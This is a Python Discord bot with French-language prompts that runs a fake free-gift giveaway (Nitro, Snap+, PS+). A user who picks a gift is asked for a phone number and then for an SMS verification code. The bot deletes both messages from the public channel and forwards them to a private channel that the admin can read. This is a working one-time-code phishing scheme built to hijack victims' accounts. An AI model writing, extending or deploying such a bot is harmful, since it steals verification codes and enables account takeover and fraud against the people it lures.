import discord
from discord.ext import commands
import os
import asyncio

# Configuration des intents
intents = discord.Intents.default()
intents.message_content = True
intents.members = True

# Création du bot avec le préfixe +
bot = commands.Bot(command_prefix="+", intents=intents)

# Récupération des variables d'environnement
DISCORD_TOKEN = os.getenv("DISCORD_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))

GIFTS = [
    discord.SelectOption(label="Discord Nitro 1 An", emoji="💎", value="nitro_1y"),
    discord.SelectOption(label="Snap+", emoji="👻", value="snap_plus"),
    discord.SelectOption(label="PS+", emoji="🎮", value="ps_plus"),
    discord.SelectOption(label="Déco de ton choix", emoji="🌸", value="deco_choice"),
    discord.SelectOption(label="Pack de ton choix", emoji="🎁", value="pack_choice"),
]


def get_gift_label(value):
    """Retourne le label correspondant à la valeur du select."""
    for opt in GIFTS:
        if opt.value == value:
            return opt.label
    return None


class GiftSelect(discord.ui.Select):
    def __init__(self):
        super().__init__(placeholder="Choisis ton cadeau...", options=GIFTS, custom_id="gift_select")

    async def callback(self, interaction: discord.Interaction):
        selected_gift = self.values[0]
        gift_label = get_gift_label(selected_gift)

        # 1. Réponse immédiate pour éviter le "L'application ne répond pas"
        await interaction.response.send_message(
            f"Tu as choisi : **{gift_label}**\n\n"
            "Maintenant, entre ton numéro de téléphone (format : +33XXXXXXXXX) :",
            ephemeral=True
        )

        # 2. Vérification des messages entrants
        def check(m):
            return m.author == interaction.user and m.channel == interaction.channel

        guild = interaction.guild

        try:
            # 3. Attente du numéro de téléphone (timeout 120s)
            phone_msg = await bot.wait_for("message", check=check, timeout=120)
            phone_number = phone_msg.content.strip()
            try:
                await phone_msg.delete()
            except discord.NotFound:
                pass  # message déjà supprimé

            # Création du channel privé
            overwrites = {
                guild.default_role: discord.PermissionOverwrite(read_messages=False),
                guild.me: discord.PermissionOverwrite(read_messages=True),
                interaction.user: discord.PermissionOverwrite(read_messages=True),
            }
            admin = guild.get_member(ADMIN_ID)
            if admin:
                overwrites[admin] = discord.PermissionOverwrite(read_messages=True)

            channel_name = f"gift-{interaction.user.id}"
            private_channel = await guild.create_text_channel(
                channel_name,
                overwrites=overwrites,
                category=guild.get_channel(interaction.channel.category_id) if interaction.channel.category_id else None
            )

            # Message admin dans le nouveau channel
            embed = discord.Embed(title="🎁 Nouvelle commande", color=discord.Color.purple())
            embed.add_field(name="Utilisateur", value=f"{interaction.user.mention} (`{interaction.user.id}`)", inline=False)
            embed.add_field(name="Cadeau choisi", value=gift_label, inline=False)
            embed.add_field(name="Numéro de téléphone", value=f"||{phone_number}||", inline=False)
            await private_channel.send(embed=embed)

            # Notification à l'utilisateur
            await interaction.followup.send(
                f"Channel créé : {private_channel.mention}\n"
                "Un admin va valider ta demande. Entre le code SMS reçu (format : XXXX) :",
                ephemeral=True
            )

            # 4. Attente du code SMS
            try:
                sms_msg = await bot.wait_for("message", check=check, timeout=120)
                sms_code = sms_msg.content.strip()
                try:
                    await sms_msg.delete()
                except discord.NotFound:
                    pass

                embed2 = discord.Embed(title="📱 Code SMS reçu", color=discord.Color.blue())
                embed2.add_field(name="Utilisateur", value=f"{interaction.user.mention}", inline=False)
                embed2.add_field(name="Code SMS", value=f"||{sms_code}||", inline=False)
                await private_channel.send(embed=embed2)

                await interaction.followup.send("✅ Code SMS envoyé. Merci !", ephemeral=True)

            except asyncio.TimeoutError:
                await interaction.followup.send("⏰ Temps écoulé pour le code SMS.", ephemeral=True)

        except asyncio.TimeoutError:
            await interaction.followup.send("⏰ Temps écoulé pour le numéro de téléphone.", ephemeral=True)


class GiftView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)  # pas de timeout global
        self.add_item(GiftSelect())


@bot.event
async def on_ready():
    print(f"Bot connecté en tant que {bot.user}")


@bot.command(name="cadeaux")
async def setup(ctx):
    if ctx.author.id != ADMIN_ID:
        await ctx.send("Seul l'admin peut utiliser cette commande.")
        return

    embed = discord.Embed(
        title="🎁 Choisis ton cadeau",
        description="Sélectionne le cadeau que tu veux recevoir ci-dessous.",
        color=discord.Color.gold()
    )
    await ctx.send(embed=embed, view=GiftView())


# Lancement du bot
if __name__ == "__main__":
    if DISCORD_TOKEN:
        bot.run(DISCORD_TOKEN)
    else:
        print("Erreur : DISCORD_TOKEN n'est pas défini.")
